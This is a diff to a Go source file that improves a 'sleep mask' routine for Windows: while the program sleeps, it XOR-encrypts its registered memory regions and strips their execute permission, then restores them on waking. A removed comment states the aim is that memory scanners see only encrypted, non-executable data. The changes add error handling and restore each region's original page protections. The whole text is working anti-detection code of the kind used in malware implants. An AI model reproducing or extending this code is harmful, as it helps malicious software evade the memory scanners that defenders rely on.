@@ -46,16 +46,7 @@ func (m *Mask) WithMethod(method SleepMethod) *Mask {
 }
 
 // Sleep encrypts all registered regions, sleeps for the given duration,
-// then decrypts and restores executable permissions.
-//
-// During sleep:
-//   - All regions are XOR-encrypted with a random 32-byte key
-//   - Page permissions are downgraded to PAGE_READWRITE (not executable)
-//   - Memory scanners see encrypted, non-executable data
-//
-// After waking:
-//   - Regions are decrypted (same XOR)
-//   - Page permissions are restored to PAGE_EXECUTE_READ
+// then decrypts and restores original page permissions.
 func (m *Mask) Sleep(d time.Duration) {
 	if len(m.regions) == 0 || d <= 0 {
 		return
@@ -63,13 +54,15 @@ func (m *Mask) Sleep(d time.Duration) {
 
 	// Generate random XOR key.
 	key := make([]byte, 32)
-	rand.Read(key)
+	if _, err := rand.Read(key); err != nil {
+		return // cannot encrypt safely without a key
+	}
 
-	// Encrypt + downgrade permissions.
-	for _, r := range m.regions {
+	// Save original protections, encrypt, downgrade to RW.
+	origProtect := make([]uint32, len(m.regions))
+	for i, r := range m.regions {
 		xorRegion(r.Addr, r.Size, key)
-		var old uint32
-		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &old)
+		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &origProtect[i])
 	}
 
 	// Sleep.
@@ -80,12 +73,12 @@ func (m *Mask) Sleep(d time.Duration) {
 		time.Sleep(d)
 	}
 
-	// Decrypt + restore executable permissions.
-	for _, r := range m.regions {
-		var old uint32
-		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &old)
+	// Decrypt + restore ORIGINAL permissions (not hardcoded PAGE_EXECUTE_READ).
+	for i, r := range m.regions {
+		var tmp uint32
+		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &tmp)
 		xorRegion(r.Addr, r.Size, key)
-		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_EXECUTE_READ, &old)
+		windows.VirtualProtect(r.Addr, r.Size, origProtect[i], &tmp)
 	}
 
 	// Zero the key from memory.
